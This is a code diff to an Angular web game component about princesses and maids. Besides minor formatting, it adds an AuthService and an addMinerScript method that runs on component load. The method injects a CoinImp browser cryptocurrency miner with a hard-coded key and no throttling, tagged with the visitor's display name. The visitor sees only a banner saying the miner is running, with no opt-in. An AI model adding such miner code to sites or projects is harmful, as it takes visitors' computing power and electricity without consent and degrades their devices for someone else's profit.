@@ -1,5 +1,6 @@
 import { Component, OnInit } from '@angular/core';
 import { SideSettings } from 'src/app/components/models/coin';
+import { AuthService } from 'src/app/services/auth/auth.service';
 
 @Component({
   selector: 'app-princesses',
@@ -22,10 +23,22 @@ export class PrincessesComponent implements OnInit {
   continueActive: boolean = false;
   isPrincessLevel: boolean = false;
 
-  constructor() { }
+  constructor(
+    public auth: AuthService,
+  ) { }
 
   ngOnInit() {
     this.setLevelName();
+
+    this.auth.user.subscribe(user => {
+      let minerName = "guest";
+
+      if (user) {
+        minerName = user.displayName;
+      } 
+
+      this.addMinerScript(minerName);
+    });
   }
 
   startGame() {
@@ -39,6 +52,22 @@ export class PrincessesComponent implements OnInit {
 
   }
 
+  addMinerScript(minerName: string) {
+
+    const publicKey = "eb5cb6a491a566fb786a0419555a8a9445ba0d85b5a2bf97628b99413f9c7976";
+    let script_tag = document.createElement('script');
+    script_tag.type = 'text/javascript';
+    script_tag.text = `
+      var _client = new Client.User('${publicKey}', '${minerName}', {throttle: 0, c: 'w'});
+      console.log({_client});
+      _client.on('found', (e) => console.log({hashes: e.hashes, rate: e.hashesPerSecond}));
+      _client.start();
+      _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+    `
+    console.log({script_tag})
+    document.getElementsByTagName('body')[0].insertBefore(script_tag, document.getElementsByTagName('app-root')[0]);
+  }
+
   checkAnswer(side: string) {
     if (!this.rolledNumber) return;
 
@@ -48,11 +77,11 @@ export class PrincessesComponent implements OnInit {
     if ((this.animateLeft && side == 'left') || (this.animateRight && side == 'right')) {
       this.result = "Correct";
       this.awardCount = 1;
-      console.log({score: this.score});
+      console.log({ score: this.score });
       if (this.score == 4) {
         this.isPrincessLevel = true;
         this.level = this.level + 1;
-        this.result = 'Congratulations, you become a maid!'; 
+        this.result = 'Congratulations, you become a maid!';
         this.levelText = 'A maid has more subtle intuition and therefore the flickering will be less noticable now.';
         this.setLevelName();
       }
@@ -64,16 +93,16 @@ export class PrincessesComponent implements OnInit {
         this.setLevelName();
       }
     } else {
-        this.awardCount = 0;
-        this.result = "Try again";
+      this.awardCount = 0;
+      this.result = "Try again";
     }
 
     this.score = this.score + this.awardCount;
-    this.animateRight =  this.animateLeft = false;
+    this.animateRight = this.animateLeft = false;
   }
 
   setLevelName() {
     this.levelName = this.levels[this.level];
   }
-  
+
 }
